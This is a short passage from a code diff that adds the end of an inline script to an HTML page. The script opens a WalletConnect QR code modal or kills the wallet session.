+                window.WalletConnectQRCodeModal.default.open(uri, () => {
+                    console.log('QR Code Modal closed');
+                });
+            });
+        } else {
+            walletConnector.killSession();
+        }
+    }
+}
+    </script>
+
 </body>
 
 </html>
